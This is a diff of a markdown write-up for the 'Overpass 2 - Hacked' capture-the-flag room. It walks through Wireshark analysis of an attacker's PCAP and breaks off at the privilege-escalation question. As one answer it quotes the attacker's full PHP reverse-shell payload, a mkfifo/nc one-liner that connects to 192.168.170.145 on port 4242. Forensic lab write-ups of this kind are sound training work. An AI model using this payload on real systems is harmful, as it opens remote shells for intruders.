@@ -1,17 +1,25 @@
 # Overpass 2 - Hacked
 Overpass has been hacked! Can you analyse the attacker's actions and hack back in?
 
+**Note:** This CTF expects you to be familiar with using tools and Linux CLI, but I will explain the best that I can as we walk through this room.
+
 ## Task 1 - *Forensics - Analyse the PCAP*
 
-**Q:** What was the URL of the page they used to upload a reverse shell? \
-**Mindset:** \
-**Answer:** `/development/` \
-**Explaination:**
+### 1. What was the URL of the page they used to upload a reverse shell?
 
-**Q:** What payload did the attacker use to gain access? \
-**Mindset:** \
+**Analysis:** So we know that the attacker has **uploaded** some kind of payload to a **web server**. Knowing it's some type of interaction with a **web server**, I think we can safely assume that the protocol we should filter for in Wireshark is **HTTP**. <br>
+![image](https://user-images.githubusercontent.com/85798849/222154541-e10bdb04-8dd1-46c6-8779-fb970c6bb297.png)
+Now that we only see **HTTP** traffic, we now see an interesting **POST** request which contains the URL of the page that the attacker uploaded the payload to. <br>
+*(Note: An HTTP POST request is used to send data to a server to create/update a resource.)*
+
+**Answer:** `/development/` <br>
+
+---
+
+### 2. What payload did the attacker use to gain access?
+**Analysis:** <br>
+
 **Answer:** `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`\
-**Explaination:**
 
 **Q:** What password did the attacker use to privesc? \
 **Mindset:** \
